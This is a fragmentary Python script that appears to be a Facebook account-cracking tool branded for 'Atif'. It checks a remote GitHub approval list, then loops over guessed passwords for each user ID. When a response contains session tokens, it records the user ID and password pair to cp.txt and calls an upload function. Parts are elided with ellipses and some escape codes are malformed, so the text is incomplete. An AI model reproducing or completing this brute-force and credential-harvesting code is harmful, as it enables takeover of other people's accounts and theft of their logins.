...
def irfan():
	...
	runtxt("\n\033[0;91m🧞‍This tool is offical for Atif")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/-70/Approvel/main/200%20Tool').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m═══════════════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [] : %s/%s -> \033[0;92m [ -OK:%s ]- \033[0;91m[-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;91m[Atif-CP] %s|%s\033[0;97         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Atif-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
